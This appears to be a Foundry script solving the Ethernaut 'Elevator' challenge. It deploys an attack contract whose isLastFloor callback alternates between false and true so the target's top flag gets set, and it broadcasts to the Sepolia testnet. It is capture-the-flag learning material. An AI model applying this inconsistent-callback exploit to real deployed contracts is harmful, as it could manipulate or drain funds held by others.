// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Elevator, Building} from "../src/Elevator.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Elevator.s.sol --tc ElevatorSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv


/* Attack idea: We need to set `top` to be true

    This is done by using the building (msg.sender) contract that will contain the function of isLastFloor

    notice that it will enter the if it the first time it returns false

    and with the same number it should return true

    We can create a function that starts with false and then return true alternating the boolean value
*/

contract ElevatorSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = (vm.envAddress("ELEVATOR_INSTANCE"));

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // Create an instance of the attack contract
        Attack attackContract = new Attack(instance);
        // Call the goTo function with the attack contract address
        attackContract.attack();
        vm.stopBroadcast();
    }
}

contract Attack is Building {
    bool public alternate = true;
    Elevator elevatorInstance;

    constructor(address _instance) {
        elevatorInstance = Elevator(_instance);
    }

    function attack() public {
        // Call the goTo function with the attack contract address
        elevatorInstance.goTo(1);
    }

    // We basically want the first time the isLastFloor function is called to return false and the second time to return true
    function isLastFloor(uint256 _floor) external override returns (bool) {
        alternate = !alternate;
        return alternate;
    }
}
